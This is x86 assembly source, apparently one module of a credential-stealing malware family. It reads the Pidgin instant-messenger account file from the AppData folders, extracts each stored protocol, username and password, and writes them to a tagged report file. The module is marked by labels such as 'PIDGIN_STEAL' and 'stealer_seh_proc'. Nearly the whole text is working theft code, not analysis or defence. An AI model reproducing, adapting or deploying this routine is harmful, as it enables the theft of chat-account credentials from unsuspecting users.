     
.data?
      pidgin_AppData         db 100h dup (?)
      pidgin_Protocol        db 100h dup (?)
      pidgin_User            db 100h dup (?)
      pidgin_Pass            db 100h dup (?)
     
.code

process_pidgin_path proc lpPath:DWORD
      LOCAL   pidgin_hFile :DWORD
      LOCAL   hSize    :DWORD
      LOCAL   hMem     :DWORD
      LOCAL   nr       :DWORD
      LOCAL   p1       :DWORD
      LOCAL   pbegin   :DWORD
      LOCAL   pend     :DWORD
      LOCAL   gbegin   :DWORD
      
      CreateFile, lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
      cmp     eax, INVALID_HANDLE_VALUE
      je      pidgin_shit_bricks
      mov     pidgin_hFile, eax
      GetFileSize, pidgin_hFile, 0
      test    eax, eax
      je      pidgin_ZeroSize
      add     eax, 1
      mov     hSize, eax
      VirtualAlloc, 0, hSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      pidgin_ZeroSize
      mov     hMem, eax
      SetFilePointer, pidgin_hFile, 0, 0, FILE_BEGIN
      .if     eax == INVALID_SET_FILE_POINTER
              jmp     pidgin_read_shit
      .endif
      ReadFile, pidgin_hFile, hMem, hSize, addr nr, NULL
      .if     eax == 0
              jmp     pidgin_read_shit
      .endif
      
      xor     ebx, ebx
    pidgin_parse_lp:
      mov     ecx, dword ptr [hMem]
      add     ecx, ebx
      mov     dword ptr [p1], ecx
      
      lstrlen, p1
      push    eax
      lstrlen, addr pidginserver1
      push    eax
      push    dword ptr [p1]
      push    offset pidginserver1
      call    strpos
      
      test    eax, eax
      je      no_pwds_here
      mov     dword ptr [pbegin], eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr pidginserver2
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver2
      call    strpos
      
      test    eax, eax
      je      no_pwds_here
      mov     dword ptr [pend], eax
      sub     eax, dword ptr [pbegin]
      
      mov     eax, pend
      sub     eax, pbegin
      push    eax
      lstrlen, addr pidginserver3
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver3
      call    strpos
      
      test    eax, eax
      je      no_pwds_here
      add     eax, sizeof pidginserver3-1
      mov     dword ptr [gbegin], eax
      
      mov     eax, pend
      sub     eax, pbegin
      push    eax
      lstrlen, addr pidginserver4
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver4
      call    strpos
      
      test    eax, eax
      je      no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr pidgin_Protocol, gbegin, eax
      
      mov     eax, pend
      sub     eax, pbegin
      push    eax
      lstrlen, addr pidginserver5
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver5
      call    strpos
      
      test    eax, eax
      je      no_pwds_here
      add     eax, sizeof pidginserver5-1
      mov     dword ptr [gbegin], eax
      
      mov     eax, pend
      sub     eax, pbegin
      push    eax
      lstrlen, addr pidginserver6
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver6
      call    strpos
      
      test    eax, eax
      je      no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr pidgin_User, gbegin, eax
      
      mov     eax, pend
      sub     eax, pbegin
      push    eax
      lstrlen, addr pidginserver7
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver7
      call    strpos
      
      test    eax, eax
      je      skip_and_try_without_pwd
      add     eax, sizeof pidginserver7-1
      mov     dword ptr [gbegin], eax
      
      mov     eax, pend
      sub     eax, pbegin
      push    eax
      lstrlen, addr pidginserver8
      push    eax
      push    dword ptr [pbegin]
      push    offset pidginserver8
      call    strpos
      
      test    eax, eax
      je      skip_and_try_without_pwd
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr pidgin_Pass, gbegin, eax
      
    skip_and_try_without_pwd:
      lstrlen, addr pidgin_Protocol
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PROTOCOL
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr pidgin_Protocol, plen, addr SNW, NULL
      
      lstrlen, addr pidgin_User
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr pidgin_User, plen, addr SNW, NULL
      
      lstrlen, addr pidgin_Pass
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr pidgin_Pass, plen, addr SNW, NULL
      
      RtlZeroMemory, addr pidgin_Protocol, sizeof pidgin_Protocol
      RtlZeroMemory, addr pidgin_User, sizeof pidgin_User
      RtlZeroMemory, addr pidgin_Pass, sizeof pidgin_Pass
      
      mov     ebx, dword ptr [pend]
      sub     ebx, dword ptr [hMem]
      inc     ebx
      cmp     ebx, dword ptr [hSize]
      jle     pidgin_parse_lp
      
    no_pwds_here:
    pidgin_read_shit:
      VirtualFree, hMem, 0, MEM_RELEASE
    pidgin_ZeroSize:
      CloseHandle, pidgin_hFile
    pidgin_shit_bricks:
      ret
process_pidgin_path endp

GetPidginPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], PIDGIN_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetPidginPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
     
      mov     byte ptr [pidgin_AppData], 0
      
      push    0
      push    CSIDL_APPDATA
      push    offset pidgin_AppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset pidgin_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr pidgin_AppData, addr pidgin_path
      invoke  process_pidgin_path, addr pidgin_AppData
      
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset pidgin_AppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset pidgin_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr pidgin_AppData, addr pidgin_path
      invoke  process_pidgin_path, addr pidgin_AppData
      
    GetPidginPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetPidginPwd endp
